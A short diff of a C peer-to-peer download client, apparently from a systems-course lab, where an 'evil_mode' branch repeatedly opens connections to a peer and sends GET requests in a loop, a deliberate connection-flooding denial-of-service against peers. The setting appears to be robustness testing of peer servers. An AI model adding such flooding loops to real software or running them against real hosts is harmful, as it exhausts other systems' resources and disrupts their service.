@@ -524,15 +524,19 @@ static void task_download(task_t *t, task_t *tracker_task)
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
 		t->filename);
 	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-
-	if(evil_mode) //attempt to ddos them?
-	  while((t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port)) != -1);
+	
+	if(evil_mode) //attempt to ddos them? Nope
+	  while((t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port)) != -1){
+	    osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	  }
 	
 	if (t->peer_fd == -1) {
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+
+	
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
